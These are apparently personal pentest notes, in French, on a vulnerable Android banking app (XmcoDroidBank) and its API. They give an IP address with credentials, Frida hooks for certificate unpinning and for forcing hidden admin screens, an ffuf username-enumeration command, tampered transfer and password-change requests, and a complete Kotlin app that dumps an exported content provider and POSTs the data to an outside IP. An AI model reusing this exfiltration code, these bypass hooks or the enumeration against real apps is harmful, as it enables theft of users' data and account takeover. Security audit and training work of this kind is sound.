

```
API:
3.64.133.246

Creds:
JackBlack / XmcoAudit2020!
test / test
test / @Test1234
devadmin / test
devadmin / test1234

Compte banquaire:
JackBlack: 54000
test: 100000

```

![[IMG-20260316114919256.png]]


![[IMG-20260313114941226.png]]

```
frida --codeshare akabe1/frida-multiple-unpinning -f com.android.xmcodroidbank -U
```

```
frida-ps -Uai | grep -i xmcodroid
frida -U -p <pid> -l anti-npe-asynctask.js
```

```java
Java.perform(function () {

var classes = [
"com.android.xmcodroidbank.DoTransfer$RequestDoGets2",
"com.android.xmcodroidbank.ChangePassword$RequestChangePasswordTask"
];

classes.forEach(function (cls) {
  
try {
  
var Target = Java.use(cls);
  
Target.doInBackground.overloads.forEach(function (ovl) {
  
ovl.implementation = function () {
try {
  
return ovl.apply(this, arguments); 

} catch (e) {
  
console.log("[!] Prevented crash in " + cls);
console.log("[!] Exception: " + e);
var retType = ovl.returnType.type;  

if (retType === "boolean") return false;
if (retType === "int") return 0;
if (retType === "void") return;
return null;
  
}
  
};
  
});
  
console.log("[+] Hook installed on " + cls); 

} catch (e) {
  
console.log("[-] Class not found: " + cls);
  
}
  
});
  
});
```


```
apktool d xmco.apk
jadx-gui xmco.apk &
```

![[IMG-20260313144558359.png]]

![[IMG-20260313142926660.png]]


```
Account:
5555555555554444
371449635398431
```

## Pentest API

### Modification de l'émetteur d'un virement (ACL)
```
password=@Test1234&amount=41000&to_acc=5555555555554444&from_acc=371449635398431&label=Shopping&username=test
```

![[IMG-20260313153227268.png]]

Condition:
Le compte associé au champ `password/username` doit être diffénrent du compte associé à l'id dans le champ `to_acc`. Sinon:
![[IMG-20260313153716211.png]]

### Changement du mdp d'un autre compte que le sien (ACL)

![[IMG-20260313154432060.png]]

![[IMG-20260313154559733.png]]


### Le compte admin:admin existe

![[IMG-20260313171330944.png]]

### Mauvaise Gestion des erreurs dans la requête login

![[IMG-20260313171740664.png]]
![[Pasted image 20260317101849.png]]


![[IMG-20260313173112537.png]]
```
ffuf -w /Users/tdutrey/Documents/tools/Wordlist/SecLists/Usernames/top-usernames-shortlist.txt \
-u https://3.64.133.246/login \
-X POST \
-H "Content-Type: application/x-www-form-urlencoded" \
-d "password=@Test1234&username=FUZZ" \
-fr '"account_number": null' \
-k
```

#### IDOR Champ account (ACL)

![[Pasted image 20260317101341.png]]

### Transaction inversé dans le cham "amount"

![[Pasted image 20260317095415.png]]

## Pentest APK


#### Trop de permission sont données à l'app

![[Pasted image 20260317105008.png]]

![[Pasted image 20260320151747.png]]

```java
package com.example.auditxmco  
  
import android.net.Uri  
import android.os.Bundle  
import androidx.activity.ComponentActivity  
import java.net.HttpURLConnection  
import java.net.URL  
  
class MainActivity : ComponentActivity() {  
    override fun onCreate(savedInstanceState: Bundle?) {  
        super.onCreate(savedInstanceState)  
  
        val uri = Uri.parse(  
            "content://com.android.xmcodroidbank.TrackUserContentProvider/trackerusers"  
        )  
  
        val cursor = contentResolver.query(uri, null, null, null, null)  
        val data = StringBuilder()  
  
        cursor?.use {  
            while (it.moveToNext()) {  
                data.append(it.getString(1)).append("\n")  
            }  
        }  
  
        Thread {  
            try {  
                val conn = URL("http://212.129.9.19:5555")  
                    .openConnection() as HttpURLConnection  
  
                conn.requestMethod = "POST"  
                conn.doOutput = true  
  
                conn.outputStream.use { os ->  
                    os.write(data.toString().toByteArray())  
                }  
  
                conn.responseCode // trigger request  
  
            } catch (_: Exception) {}  
        }.start()  
  
        finish()  
    }  
}
```

![[Pasted image 20260320151817.png]]

![[Pasted image 20260320151843.png]]

### Compte Hard codé dans l'app (DoLogin)

```
if (DoLogin.this.username.equals("devadmin") || (DoLogin.this.username.equals("test") && DoLogin.this.password.equals("test")))
```

![[IMG-20260313144850272.png]]


### Clé Hard Codé dans l app (CryptoClass)

![[Pasted image 20260319162842.png]]

### Mdps stockés en base 64 dans la BDD (DoLogin)
![[Pasted image 20260319163008.png]]

![[Pasted image 20260319163403.png]]


### Fuite du nouveau mot de passe via broadcast implicite

![[Pasted image 20260319163549.png]]

Le mot de passe est envoyé dans un **broadcast implicite** avec une action custom.  
Si une autre app peut écouter cette action, elle peut intercepter :
- le numéro de téléphone,
- le nouveau mot de passe.

### Fonctionnalité admin caché dans le front de l'application

![[Pasted image 20260319165103.png]]

On peut afficher la page avec frida de cette facon:

```js
Java.perform(function () {
    var Resources = Java.use("android.content.res.Resources");
    Resources.getString.overload('int').implementation = function (id) {
        var result = this.getString(id);
        if (result === "no") {
            console.log("[+] Replacing is_admin value");
            return "yes";
        }
        return result;
    };
});
```

![[Pasted image 20260319165219.png]]

![[Pasted image 20260319165228.png]]

Puis il y a pas de controle de l'utilisateur:
![[Pasted image 20260319170545.png]]

N importe qui peut donc créer un compte

